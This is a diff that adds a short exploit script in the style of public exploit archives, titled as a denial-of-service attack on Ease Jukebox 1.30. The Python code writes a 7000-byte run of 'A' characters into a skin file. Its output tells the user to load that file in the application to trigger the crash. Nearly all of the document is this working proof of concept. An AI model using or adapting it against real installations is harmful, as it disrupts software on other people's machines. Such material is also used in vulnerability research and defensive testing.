@@ -1,0 +1,17 @@
+#Exploit Title :Ease Jukebox 1.30 Dos vulnerability 
+#Software : Ease Jukebox 1.30
+#Software link : http://www.mymusictools.com/all-in-one_jukebox_9/ease_jukebox_4040.htm
+#Autor : Sweet
+#Email : charif38@hotmail.fr
+#Software version : 1.30
+#Tested on : WinXP sp3 ENG vm
+# (thx to Milw0rm.com , JF - Hamst0r - Keystroke) R.I.P  , inj3ct0r.com , exploit-db.com, packetstormsecurity.org, http://ha.ckers.org et 1,2,3 viva L'Algerie :))
+#!/usr/bin/python
+outfile="skin1.skn"
+junk="\x41" * 7000
+FILE=open(outfile, "w") 
+FILE.write(junk)
+FILE.close()
+print "[+] File created succesufully , copy the file into the skin folder , open the aplication and select skin1  [+]"
+
+
